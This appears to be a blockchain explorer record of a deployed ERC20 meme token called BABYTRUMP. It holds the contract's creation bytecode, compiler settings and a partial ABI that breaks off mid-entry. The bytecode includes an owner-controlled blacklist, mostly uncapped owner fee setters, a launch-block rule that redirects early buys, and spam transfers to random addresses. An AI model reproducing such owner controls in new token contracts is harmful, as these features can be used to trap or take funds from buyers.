{
    "address": "0x636aD441CdA1EC74BC059A23615b9D9c3464d9e3",
    "tx_hash": "9a4d6a467a166350a2eff7dd8a7f5ce4f8f1b082ed79b9294358dfc1107a5c9e",
    "block_number": 18002291,
    "timestamp": 1693094483,
    "gas_used_in_creation": 6153056,
    "creation_bytecode": "60806040819052600580546001600160a01b03191661dead1790556002600d8190556003600e8190556004600f819055600060108190556011849055601283905560138290556014819055601593909355601691909155601755600960188190556019819055601a556020819055602455602680546201000160a81b62ffffff60a81b1990911617905562003b3438819003908190833981016040819052620000a891620007cc565b6000859050806001600160a01b031663c45a01556040518163ffffffff1660e01b815260040160206040518083038186803b158015620000e757600080fd5b505afa158015620000fc573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620001229190620007a8565b6001600160a01b031663c9c6539630836001600160a01b031663ad5c46486040518163ffffffff1660e01b815260040160206040518083038186803b1580156200016b57600080fd5b505afa15801562000180573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620001a69190620007a8565b6040516001600160e01b031960e085901b1681526001600160a01b03928316600482015291166024820152604401602060405180830381600087803b158015620001ef57600080fd5b505af115801562000204573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200022a9190620007a8565b602680546001600160a01b0319166001600160a01b039290921691909117905589516200025f9060019060208d019062000632565b508851620002759060029060208c019062000632565b506003805460ff8a1660ff199091168117909155600080546001600160a01b0388166001600160a01b03199182168117909255602280549091169091179055620002c190600a62000918565b620002cd9088620009d7565b601d55600354620002e39060ff16600a62000918565b620002ef9088620009d7565b601e55600354620003059060ff16600a62000918565b620003119088620009d7565b601f55600354620003279060ff16600a62000918565b620003339088620009d7565b601c55600354620003499060ff16600a62000918565b62000356906001620009d7565b602090815560038054610100600160a81b0319166101006001600160a01b038881169190910291909117909155600480546001600160a01b031916918616919091179055600f54600e54600d54620003d193620003bd9290620005c3811b62001b9a17901c565b620005c360201b62001b9a1790919060201c565b601981905550620003fc601354620003bd601254601154620005c360201b62001b9a1790919060201c565b601a8190555062000427601754620003bd601654601554620005c360201b62001b9a1790919060201c565b601855602580546001600160a01b038084166001600160a01b03199092168217909255601d8054306000818152600860209081526040808320968352958152858220939093558a861680825260098452858220805460ff1990811660019081179092558484528784208054821683179055828452600a86528784208054821683179055602680548a16855288852080548316841790558585528885208054831684179055600580548b1686528986208054841685179055848652600b88528986208054841685179055548a16855288852080548316841790559484528784208054821683179055935488168352600c855286832080549094161790925592549083526007909152828220559051918416913480156108fc0292909190818181858888f1935050505015801562000561573d6000803e3d6000fd5b50846001600160a01b031660006001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef601d54604051620005ab91815260200190565b60405180910390a35050505050505050505062000a62565b600080620005d28385620008b4565b905083811015620006295760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015260640160405180910390fd5b90505b92915050565b8280546200064090620009f9565b90600052602060002090601f016020900481019282620006645760008555620006af565b82601f106200067f57805160ff1916838001178555620006af565b82800160010185558215620006af579182015b82811115620006af57825182559160200191906001019062000692565b50620006bd929150620006c1565b5090565b5b80821115620006bd5760008155600101620006c2565b80516001600160a01b0381168114620006f057600080fd5b919050565b600082601f83011262000706578081fd5b81516001600160401b038082111562000723576200072362000a4c565b604051601f8301601f19908116603f011681019082821181831017156200074e576200074e62000a4c565b816040528381526020925086838588010111156200076a578485fd5b8491505b838210156200078d57858201830151818301840152908201906200076e565b838211156200079e57848385830101525b9695505050505050565b600060208284031215620007ba578081fd5b620007c582620006d8565b9392505050565b60008060008060008060008060006101208a8c031215620007eb578485fd5b89516001600160401b038082111562000802578687fd5b620008108d838e01620006f5565b9a5060208c015191508082111562000826578687fd5b50620008358c828d01620006f5565b98505060408a015160ff811681146200084c578586fd5b60608b015190975095506200086460808b01620006d8565b94506200087460a08b01620006d8565b93506200088460c08b01620006d8565b92506200089460e08b01620006d8565b9150620008a56101008b01620006d8565b90509295985092959850929598565b60008219821115620008ca57620008ca62000a36565b500190565b600181815b8085111562000910578160001904821115620008f457620008f462000a36565b808516156200090257918102915b93841c9390800290620008d4565b509250929050565b6000620007c560ff84168360008262000934575060016200062c565b8162000943575060006200062c565b81600181146200095c5760028114620009675762000987565b60019150506200062c565b60ff8411156200097b576200097b62000a36565b50506001821b6200062c565b5060208310610133831016604e8410600b8410161715620009ac575081810a6200062c565b620009b88383620008cf565b8060001904821115620009cf57620009cf62000a36565b029392505050565b6000816000190483118215151615620009f457620009f462000a36565b500290565b600181811c9082168062000a0e57607f821691505b6020821081141562000a3057634e487b7160e01b600052602260045260246000fd5b50919050565b634e487b7160e01b600052601160045260246000fd5b634e487b7160e01b600052604160045260246000fd5b6130c28062000a726000396000f3fe6080604052600436106104405760003560e01c80638da5cb5b11610234578063c816841b1161012e578063e5c2b0a6116100b6578063f2fde38b1161007a578063f2fde38b14610cd2578063f744bf2214610cf2578063f84ba65d14610d12578063f872858a14610d32578063fb1eb14b14610d5357600080fd5b8063e5c2b0a614610c3c578063ec28438a14610c5c578063ef422a1814610c7c578063f0cd1dac14610c9c578063f1d5f51714610cb257600080fd5b8063d158272d116100fd578063d158272d14610b84578063da00097d14610ba9578063dc44b6a014610bca578063dd62ed3e14610be0578063e32759cf14610c2657600080fd5b8063c816841b14610b08578063c860795214610b28578063c867d60b14610b3e578063cab0347114610b6e57600080fd5b8063a83f53a7116101bc578063c469b6dd11610180578063c469b6dd14610a7c578063c492f04614610a92578063c49b9a8014610ab2578063c5d2418914610ad2578063c7f063d314610ae857600080fd5b8063a83f53a7146109e6578063a9059cbb146109fc578063b2bdfa7b14610a1c578063b6b3664314610a3c578063c2d4640e14610a5c57600080fd5b80639a55fff0116102035780639a55fff01461095b578063a073d37f1461097b578063a08e671f14610990578063a457c2d7146109a6578063a5d69d1f146109c657600080fd5b80638da5cb5b146108fd578063914eb66a1461091b57806395d89b4114610930578063993945ac1461094557600080fd5b80633b97084a116103455780635881f3ef116102cd57806382eefb431161029157806382eefb4314610861578063844d591c14610877578063865541e71461089757806388790a68146108b75780638b42507f146108cd57600080fd5b80635881f3ef146107c957806361a23c69146107e957806370a08231146107ff5780637d1db4a514610835578063807c2d9c1461084b57600080fd5b80634a74bb02116103145780634a74bb021461072f5780634cb80fd5146107505780635342acb414610770578063557ed1ba146107a057806357a5802f146107b357600080fd5b80633b97084a146106b35780633df4ddf4146106d35780633ecad271146106e957806341c0e1b51461071957600080fd5b806323b872dd116103c85780632b112e49116103975780632b112e49146106265780632c4b23341461063b578063313ce5671461065b57806337e5ccf71461067d578063395093511461069357600080fd5b806323b872dd146105b05780632563ae83146105d057806327c8f835146105f0578063297ac6de1461061057600080fd5b80631694505e1161040f5780631694505e1461050157806318160ddd146105215780631870517a146105405780631cdd3be3146105605780632198cf6c1461059057600080fd5b806306fdde031461044c578063095ea7b3146104775780630d5e5c87146104a75780631245e347146104c957600080fd5b3661044757005b600080fd5b34801561045857600080fd5b50610461610d69565b60405161046e9190612e48565b60405180910390f35b34801561048357600080fd5b50610497610492366004612cd1565b610dfb565b604051901515815260200161046e565b3480156104b357600080fd5b506104c76104c2366004612dad565b610e12565b005b3480156104d557600080fd5b506004546104e9906001600160a01b031681565b6040516001600160a01b03909116815260200161046e565b34801561050d57600080fd5b506025546104e9906001600160a01b031681565b34801561052d57600080fd5b50601d545b60405190815260200161046e565b34801561054c57600080fd5b506104c761055b366004612dad565b610e75565b34801561056c57600080fd5b5061049761057b366004612bed565b60066020526000908152604090205460ff1681565b34801561059c57600080fd5b506104c76105ab366004612c9d565b610ec9565b3480156105bc57600080fd5b506104976105cb366004612c5d565b610f1e565b3480156105dc57600080fd5b506104c76105eb366004612d7b565b610f89565b3480156105fc57600080fd5b506005546104e9906001600160a01b031681565b34801561061c57600080fd5b5061053260145481565b34801561063257600080fd5b50610532610fd1565b34801561064757600080fd5b506104c7610656366004612bed565b610ffd565b34801561066757600080fd5b5060035460405160ff909116815260200161046e565b34801561068957600080fd5b5061053260105481565b34801561069f57600080fd5b506104976106ae366004612cd1565b611049565b3480156106bf57600080fd5b506104c76106ce366004612d95565b61107f565b3480156106df57600080fd5b5061053260235481565b3480156106f557600080fd5b50610497610704366004612bed565b600c6020526000908152604090205460ff1681565b34801561072557600080fd5b5061053260245481565b34801561073b57600080fd5b5060265461049790600160a81b900460ff1681565b34801561075c57600080fd5b506104c761076b366004612bed565b6110ae565b34801561077c57600080fd5b5061049761078b366004612bed565b60096020526000908152604090205460ff1681565b3480156107ac57600080fd5b5042610532565b3480156107bf57600080fd5b5061053260155481565b3480156107d557600080fd5b506104e96107e4366004612bed565b611100565b3480156107f557600080fd5b5061053260165481565b34801561080b57600080fd5b5061053261081a366004612bed565b6001600160a01b031660009081526007602052604090205490565b34801561084157600080fd5b50610532601e5481565b34801561085757600080fd5b50610532601f5481565b34801561086d57600080fd5b50610532601a5481565b34801561088357600080fd5b506104c7610892366004612c9d565b611492565b3480156108a357600080fd5b506104c76108b2366004612d95565b6114e7565b3480156108c357600080fd5b5061053260115481565b3480156108d957600080fd5b506104976108e8366004612bed565b600b6020526000908152604090205460ff1681565b34801561090957600080fd5b506000546001600160a01b03166104e9565b34801561092757600080fd5b506104c7611536565b34801561093c57600080fd5b506104616115aa565b34801561095157600080fd5b50610532601c5481565b34801561096757600080fd5b506104c7610976366004612cfc565b6115b9565b34801561098757600080fd5b50602054610532565b34801561099c57600080fd5b5061053260185481565b3480156109b257600080fd5b506104976109c1366004612cd1565b611668565b3480156109d257600080fd5b506104c76109e1366004612d7b565b6116b7565b3480156109f257600080fd5b5061053260175481565b348015610a0857600080fd5b50610497610a17366004612cd1565b6116ff565b348015610a2857600080fd5b506000546104e9906001600160a01b031681565b348015610a4857600080fd5b506104c7610a57366004612d95565b61170c565b348015610a6857600080fd5b506104c7610a77366004612dad565b61173b565b348015610a8857600080fd5b50610532600f5481565b348015610a9e57600080fd5b506104c7610aad366004612cfc565b61178a565b348015610abe57600080fd5b506104c7610acd366004612d7b565b611833565b348015610ade57600080fd5b50610532600e5481565b348015610af457600080fd5b506104c7610b03366004612d95565b6118b5565b348015610b1457600080fd5b506026546104e9906001600160a01b031681565b348015610b3457600080fd5b5061053260125481565b348015610b4a57600080fd5b50610497610b59366004612bed565b600a6020526000908152604090205460ff1681565b348015610b7a57600080fd5b5061053260135481565b348015610b9057600080fd5b506003546104e99061010090046001600160a01b031681565b348015610bb557600080fd5b5060265461049790600160b01b900460ff1681565b348015610bd657600080fd5b50610532600d5481565b348015610bec57600080fd5b50610532610bfb366004612c25565b6001600160a01b03918216600090815260086020908152604080832093909416825291909152205490565b348015610c3257600080fd5b5061053260215481565b348015610c4857600080fd5b506104c7610c57366004612d95565b6118e4565b348015610c6857600080fd5b506104c7610c77366004612d95565b611959565b348015610c8857600080fd5b506104c7610c97366004612c9d565b611988565b348015610ca857600080fd5b5061053260195481565b348015610cbe57600080fd5b506104c7610ccd366004612d95565b6119dd565b348015610cde57600080fd5b506104c7610ced366004612bed565b611a0c565b348015610cfe57600080fd5b506104c7610d0d366004612d95565b611af6565b348015610d1e57600080fd5b506104c7610d2d366004612c9d565b611b45565b348015610d3e57600080fd5b5060265461049790600160b81b900460ff1681565b348015610d5f57600080fd5b50610532601b5481565b606060018054610d7890612f9b565b80601f0160208091040260200160405190810160405280929190818152602001828054610da490612f9b565b8015610df15780601f10610dc657610100808354040283529160200191610df1565b820191906000526020600020905b815481529060010190602001808311610dd457829003601f168201915b5050505050905090565b6000610e08338484611bf9565b5060015b92915050565b6000546001600160a01b03163314610e455760405162461bcd60e51b8152600401610e3c90612e9b565b60405180910390fd5b601183905560128290556013819055601454610e6d90610e6783818787611b9a565b90611b9a565b601a55505050565b6000546001600160a01b03163314610e9f5760405162461bcd60e51b8152600401610e3c90612e9b565b600d839055600e829055600f819055601054610ec190610e6783818787611b9a565b601955505050565b6000546001600160a01b03163314610ef35760405162461bcd60e51b8152600401610e3c90612e9b565b6001600160a01b03919091166000908152600a60205260409020805460ff1916911515919091179055565b6000610f2b848484611d1d565b50610f7e8433610f7985604051806060016040528060288152602001613020602891396001600160a01b038a166000908152600860209081526040808320338452909152902054919061224a565b611bf9565b5060015b9392505050565b6000546001600160a01b03163314610fb35760405162461bcd60e51b8152600401610e3c90612e9b565b60268054911515600160b81b0260ff60b81b19909216919091179055565b6005546001600160a01b0316600090815260076020526040812054601d54610ff891612284565b905090565b6000546001600160a01b031633146110275760405162461bcd60e51b8152600401610e3c90612e9b565b600480546001600160a01b0319166001600160a01b0392909216919091179055565b3360008181526008602090815260408083206001600160a01b03871684529091528120549091610e08918590610f799086611b9a565b6000546001600160a01b031633146110a95760405162461bcd60e51b8152600401610e3c90612e9b565b602055565b6000546001600160a01b031633146110d85760405162461bcd60e51b8152600401610e3c90612e9b565b600380546001600160a01b0390921661010002610100600160a81b0319909216919091179055565b600080546001600160a01b0316331461112b5760405162461bcd60e51b8152600401610e3c90612e9b565b6000829050806001600160a01b031663c45a01556040518163ffffffff1660e01b815260040160206040518083038186803b15801561116957600080fd5b505afa15801561117d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906111a19190612c09565b6001600160a01b031663e6a4390530836001600160a01b031663ad5c46486040518163ffffffff1660e01b815260040160206040518083038186803b1580156111e957600080fd5b505afa1580156111fd573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906112219190612c09565b6040516001600160e01b031960e085901b1681526001600160a01b0392831660048201529116602482015260440160206040518083038186803b15801561126757600080fd5b505afa15801561127b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061129f9190612c09565b91506001600160a01b03821661142357806001600160a01b031663c45a01556040518163ffffffff1660e01b815260040160206040518083038186803b1580156112e857600080fd5b505afa1580156112fc573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906113209190612c09565b6001600160a01b031663c9c6539630836001600160a01b031663ad5c46486040518163ffffffff1660e01b815260040160206040518083038186803b15801561136857600080fd5b505afa15801561137c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906113a09190612c09565b6040516001600160e01b031960e085901b1681526001600160a01b03928316600482015291166024820152604401602060405180830381600087803b1580156113e857600080fd5b505af11580156113fc573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906114209190612c09565b91505b602680546001600160a01b03199081166001600160a01b03858116918217845560258054909316948116949094179091556000908152600a60209081526040808320805460ff19908116600190811790925594549095168352600c909152902080549091169091179055919050565b6000546001600160a01b031633146114bc5760405162461bcd60e51b8152600401610e3c90612e9b565b6001600160a01b03919091166000908152600c60205260409020805460ff1916911515919091179055565b6000546001600160a01b031633146115115760405162461bcd60e51b8152600401610e3c90612e9b565b6010819055600f54600e54600d54611530928492610e67928391611b9a565b60195550565b6000546001600160a01b031633146115605760405162461bcd60e51b8152600401610e3c90612e9b565b600080546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a3600080546001600160a01b0319169055565b606060028054610d7890612f9b565b6000546001600160a01b031633146115e35760405162461bcd60e51b8152600401610e3c90612e9b565b60005b8281101561166257816006600086868581811061161357634e487b7160e01b600052603260045260246000fd5b90506020020160208101906116289190612bed565b6001600160a01b031681526020810191909152604001600020805460ff19169115159190911790558061165a81612fd6565b9150506115e6565b50505050565b6000610e083384610f7985604051806060016040528060258152602001613068602591393360009081526008602090815260408083206001600160a01b038d168452909152902054919061224a565b6000546001600160a01b031633146116e15760405162461bcd60e51b8152600401610e3c90612e9b565b60268054911515600160b01b0260ff60b01b19909216919091179055565b6000610f7e338484611d1d565b6000546001600160a01b031633146117365760405162461bcd60e51b8152600401610e3c90612e9b565b601c55565b6000546001600160a01b031633146117655760405162461bcd60e51b8152600401610e3c90612e9b565b60158390556016829055601781905561178281610e678585611b9a565b601855505050565b6000546001600160a01b031633146117b45760405162461bcd60e51b8152600401610e3c90612e9b565b60005b828110156116625781600960008686858181106117e457634e487b7160e01b600052603260045260246000fd5b90506020020160208101906117f99190612bed565b6001600160a01b031681526020810191909152604001600020805460ff19169115159190911790558061182b81612fd6565b9150506117b7565b6000546001600160a01b0316331461185d5760405162461bcd60e51b8152600401610e3c90612e9b565b60268054821515600160a81b0260ff60a81b199091161790556040517f53726dfcaf90650aa7eb35524f4d3220f07413c8d6cb404cc8c18bf5591bc159906118aa90831515815260200190565b60405180910390a150565b6000546001600160a01b031633146118df5760405162461bcd60e51b8152600401610e3c90612e9b565b602455565b6000546001600160a01b0316331461190e5760405162461bcd60e51b8152600401610e3c90612e9b565b60038111156119545760405162461bcd60e51b81526020600482015260126024820152716e657756616c7565206d757374203c3d203360701b6044820152606401610e3c565b602155565b6000546001600160a01b031633146119835760405162461bcd60e51b8152600401610e3c90612e9b565b601e55565b6000546001600160a01b031633146119b25760405162461bcd60e51b8152600401610e3c90612e9b565b6001600160a01b03919091166000908152600960205260409020805460ff1916911515919091179055565b6000546001600160a01b03163314611a075760405162461bcd60e51b8152600401610e3c90612e9b565b601f55565b6000546001600160a01b03163314611a365760405162461bcd60e51b8152600401610e3c90612e9b565b6001600160a01b038116611a9b5760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b6064820152608401610e3c565b600080546040516001600160a01b03808516939216917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e091a3600080546001600160a01b0319166001600160a01b0392909216919091179055565b6000546001600160a01b03163314611b205760405162461bcd60e51b8152600401610e3c90612e9b565b6014819055601354601254601154611b3f928492610e67928391611b9a565b601a5550565b6000546001600160a01b03163314611b6f5760405162461bcd60e51b8152600401610e3c90612e9b565b6001600160a01b03919091166000908152600b60205260409020805460ff1916911515919091179055565b600080611ba78385612f2d565b905083811015610f825760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f7700000000006044820152606401610e3c565b6001600160a01b038316611c5b5760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610e3c565b6001600160a01b038216611cbc5760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610e3c565b6001600160a01b0383811660008181526008602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b60006001600160a01b038416611d835760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b6064820152608401610e3c565b6001600160a01b038316611de55760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b6064820152608401610e3c565b60008211611e475760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b6064820152608401610e3c565b6001600160a01b03841660009081526006602052604090205460ff16158015611e8957506001600160a01b03831660009081526006602052604090205460ff16155b611ecb5760405162461bcd60e51b8152602060048201526013602482015272426c61636b6c6973746564206164647265737360681b6044820152606401610e3c565b6026546001600160a01b038481169116148015611f0057506026546001600160a01b0316600090815260076020526040902054155b15611f0a57436023555b6026546001600160a01b038581169116148015611f355750602454602354611f329190612f2d565b43105b15611f5957602254611f529085906001600160a01b0316846122c6565b9050610f82565b602654600160a01b900460ff1615611f7657611f528484846122c6565b6001600160a01b0384166000908152600b602052604090205460ff16158015611fb857506001600160a01b0383166000908152600b602052604090205460ff16155b1561202057601e548211156120205760405162461bcd60e51b815260206004820152602860248201527f5472616e7366657220616d6f756e74206578636565647320746865206d6178546044820152673c20b6b7bab73a1760c11b6064820152608401610e3c565b30600090815260076020526040812054602054909150811080159081906120515750602654600160a01b900460ff16155b801561207657506001600160a01b0386166000908152600c602052604090205460ff16155b801561208b5750602654600160a81b900460ff165b156120b157602654600160b01b900460ff16156120a85760205491505b6120b18261239a565b6040805180820182526014815273496e73756666696369656e742042616c616e636560601b6020808301919091526001600160a01b03891660009081526007909152919091205461210391869061224a565b6001600160a01b038716600090815260076020908152604080832093909355600990529081205460ff168061215057506001600160a01b03861660009081526009602052604090205460ff165b6121645761215f8787876124d5565b612166565b845b602654909150600160b81b900460ff16801561219b57506001600160a01b0386166000908152600a602052604090205460ff16155b156121d157601f546121c682610e67896001600160a01b031660009081526007602052604090205490565b11156121d157600080fd5b6001600160a01b0386166000908152600760205260409020546121f49082611b9a565b6001600160a01b038088166000818152600760205260409081902093909355915190891690600080516020613048833981519152906122369085815260200190565b60405180910390a360019350505050610f82565b6000818484111561226e5760405162461bcd60e51b8152600401610e3c9190612e48565b50600061227b8486612f84565b95945050505050565b6000610f8283836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f77000081525061224a565b6040805180820182526014815273496e73756666696369656e742042616c616e636560601b6020808301919091526001600160a01b038616600090815260079091529182205461231791849061224a565b6001600160a01b0380861660009081526007602052604080822093909355908516815220546123469083611b9a565b6001600160a01b038085166000818152600760205260409081902093909355915190861690600080516020613048833981519152906123889086815260200190565b60405180910390a35060019392505050565b6026805460ff60a01b1916600160a01b1790556018546015546000916123d0916002916123ca9182908790612797565b90612816565b905060006123de8383612284565b90506123e981612858565b601554479060009061240990612400906002612816565b60185490612284565b9050600061242b60026123ca846123ca6015548861279790919063ffffffff16565b90506000612448836123ca6017548761279790919063ffffffff16565b905060006124608261245a8786612284565b90612284565b90508015612483576003546124839061010090046001600160a01b031682612a16565b811561249f5760045461249f906001600160a01b031683612a16565b6000831180156124af5750600087115b156124be576124be8784612a51565b50506026805460ff60a01b19169055505050505050565b6001600160a01b0383166000908152600c602052604081205481908190819060ff16156125695761252260646123ca61251b60105460195461228490919063ffffffff16565b8890612797565b925060006010541180156125395750601c54601b54105b156125645761255860646123ca6010548861279790919063ffffffff16565b91506125648783612b14565b6125eb565b6001600160a01b0386166000908152600c602052604090205460ff16156125eb576125a960646123ca61251b601454601a5461228490919063ffffffff16565b925060006014541180156125c05750601c54601b54105b156125eb576125df60646123ca6014548861279790919063ffffffff16565b91506125eb8783612b14565b6001600160a01b0387166000908152600c602052604090205460ff168061262a57506001600160a01b0386166000908152600c602052604090205460ff165b1561270c576021541561270c576000805b6021548110156126f957604080516020810183905290810188905242606082015260800160408051601f1981840301815291815281516020928301206001600160a01b0381166000908152600790935291205490925061269c906001611b9a565b6001600160a01b0380841660008181526007602052604090819020939093559151908b1690600080516020613048833981519152906126df906001815260200190565b60405180910390a3806126f181612fd6565b91505061263b565b50602154612708906001612f65565b9150505b8215612774573060009081526007602052604090205461272c9084611b9a565b30600081815260076020526040908190209290925590516001600160a01b038916906000805160206130488339815191529061276b9087815260200190565b60405180910390a35b61278c61278582610e678686611b9a565b8690612284565b979650505050505050565b6000826127a657506000610e0c565b60006127b28385612f65565b9050826127bf8583612f45565b14610f825760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b6064820152608401610e3c565b6000610f8283836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f000000000000815250612baa565b604080516002808252606082018352600092602083019080368337019050509050308160008151811061289b57634e487b7160e01b600052603260045260246000fd5b6001600160a01b03928316602091820292909201810191909152602554604080516315ab88c960e31b81529051919093169263ad5c4648926004808301939192829003018186803b1580156128ef57600080fd5b505afa158015612903573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906129279190612c09565b8160018151811061294857634e487b7160e01b600052603260045260246000fd5b6001600160a01b03928316602091820292909201015260255461296e9130911684611bf9565b60255460405163791ac94760e01b81526001600160a01b039091169063791ac947906129a7908590600090869030904290600401612ef1565b600060405180830381600087803b1580156129c157600080fd5b505af11580156129d5573d6000803e3d6000fd5b505050507f32cde87eb454f3a0b875ab23547023107cfad454363ec88ba5695e2c24aa52a78282604051612a0a929190612ed0565b60405180910390a15050565b6040516001600160a01b0383169082156108fc029083906000818181858888f19350505050158015612a4c573d6000803e3d6000fd5b505050565b602554612a699030906001600160a01b031684611bf9565b60255460225460405163f305d71960e01b81523060048201526024810185905260006044820181905260648201526001600160a01b0391821660848201524260a482015291169063f305d71990839060c4016060604051808303818588803b158015612ad457600080fd5b505af1158015612ae8573d6000803e3d6000fd5b50505050506040513d601f19601f82011682018060405250810190612b0d9190612dd8565b5050505050565b601c54601b5410612b23575050565b6005546001600160a01b0316600090815260076020526040902054612b489082611b9a565b6005546001600160a01b0316600090815260076020526040902055601b54612b709082611b9a565b601b556005546040518281526001600160a01b03918216918416906000805160206130488339815191529060200160405180910390a35050565b60008183612bcb5760405162461bcd60e51b8152600401610e3c9190612e48565b50600061227b8486612f45565b80358015158114612be857600080fd5b919050565b600060208284031215612bfe578081fd5b8135610f8281613007565b600060208284031215612c1a578081fd5b8151610f8281613007565b60008060408385031215612c37578081fd5b8235612c4281613007565b91506020830135612c5281613007565b809150509250929050565b600080600060608486031215612c71578081fd5b8335612c7c81613007565b92506020840135612c8c81613007565b929592945050506040919091013590565b60008060408385031215612caf578182fd5b8235612cba81613007565b9150612cc860208401612bd8565b90509250929050565b60008060408385031215612ce3578182fd5b8235612cee81613007565b946020939093013593505050565b600080600060408486031215612d10578283fd5b833567ffffffffffffffff80821115612d27578485fd5b818601915086601f830112612d3a578485fd5b813581811115612d48578586fd5b8760208260051b8501011115612d5c578586fd5b602092830195509350612d729186019050612bd8565b90509250925092565b600060208284031215612d8c578081fd5b610f8282612bd8565b600060208284031215612da6578081fd5b5035919050565b600080600060608486031215612dc1578283fd5b505081359360208301359350604090920135919050565b600080600060608486031215612dec578283fd5b8351925060208401519150604084015190509250925092565b6000815180845260208085019450808401835b83811015612e3d5781516001600160a01b031687529582019590820190600101612e18565b509495945050505050565b6000602080835283518082850152825b81811015612e7457858101830151858201604001528201612e58565b81811115612e855783604083870101525b50601f01601f1916929092016040019392505050565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b828152604060208201526000612ee96040830184612e05565b949350505050565b85815284602082015260a060408201526000612f1060a0830186612e05565b6001600160a01b0394909416606083015250608001529392505050565b60008219821115612f4057612f40612ff1565b500190565b600082612f6057634e487b7160e01b81526012600452602481fd5b500490565b6000816000190483118215151615612f7f57612f7f612ff1565b500290565b600082821015612f9657612f96612ff1565b500390565b600181811c90821680612faf57607f821691505b60208210811415612fd057634e487b7160e01b600052602260045260246000fd5b50919050565b6000600019821415612fea57612fea612ff1565b5060010190565b634e487b7160e01b600052601160045260246000fd5b6001600160a01b038116811461301c57600080fd5b5056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa26469706673582212209207df0d67b08022a98729c671c23b6430125bf5c48d5e10b18f28fabc7b5e4864736f6c6343000804003300000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000000000038d7ea4c680000000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d00000000000000000000000070cb0550ced624c0c80af38216f1287b0c372c6f00000000000000000000000070cb0550ced624c0c80af38216f1287b0c372c6f00000000000000000000000070cb0550ced624c0c80af38216f1287b0c372c6f0000000000000000000000009bb69e4ddda0a1865fec3ba828787e6f886750f70000000000000000000000000000000000000000000000000000000000000009424142595452554d5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009424142595452554d500000000000000000000000000000000000000000000000",
    "runtime_bytecode": "",
    "contract_name": "Token",
    "compiler_version": "v0.8.4+commit.c7e474f2",
    "optimization_used": "1",
    "runs": "200",
    "abi": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"coinName\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"coinSymbol\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"coinDecimals\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"supply\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"router\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"service\",\"type\":\"address\"}],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensSwapped\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"ethReceived\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensIntoLiqudity\",\"type\":\"uint256\"}],\"name\":\"SwapAndLiquify\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"